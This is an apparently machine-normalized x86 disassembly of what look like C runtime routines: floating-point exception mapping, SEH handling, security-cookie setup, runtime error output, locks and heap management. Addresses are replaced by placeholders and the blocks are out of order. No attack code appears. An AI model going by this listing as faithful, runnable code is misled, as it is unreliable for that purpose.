cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_1002ca15
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1002c8b5
pop ecx
pop ecx
pop ebp
retn
sub_1002ca38
push sub_1002caa0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1002caa0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100242d7
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100242d7
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10030610
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_100305c6
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_100242d7
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100242d7
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_100305f6
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10030610
mov eax [ ebp + 0xc ]
push r--data
call sub_10031610
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_100242d7
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_100305dd
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100242d7
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1002cc2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1002ccc2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_100359df
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_100359df
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10024630
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
push esi
call sub_10024630
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10024630
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_10033709
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_10033695
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_10035876
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
push r--data
push ebx
push edi
call sub_10033695
add esp 0xc
test eax eax
je r-xdata
sub_1002ce6d
push 0x3
call sub_100359df
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1002ccc2
push 0xff
call sub_1002ccc2
pop ecx
pop ecx
push 0x3
call sub_100359df
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1002cea6
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_10035b9d
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10035a2a
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_1002a045
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10035b9d
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
push edi
call sub_10024aba
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_1002a045
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_100278fe
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_10024aba
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10035b9d
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_1002d034
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10031992
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1002d0ed
push 0xc
push r--data
call sub_1002ca38
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1002ce6d
push 0x1e
call sub_1002ccc2
push 0xff
call sub_10027b2c
push 0x18
call sub_1002a000
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1002972b
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1002ca7d
retn
push edi
call sub_10024aba
pop ecx
push 0xfa0
push edi
call sub_10031992
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10024aba
pop ecx
call sub_1002972b
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002d1a7
mov eax [ ebp - 0x1c ]
sub_1002d1b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1002d0ed
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10027ad8
pop ecx
sub_1002d1e3
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_1002d213
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_1002b740
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_1002d529
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_1002d5d9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_1002d6e1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
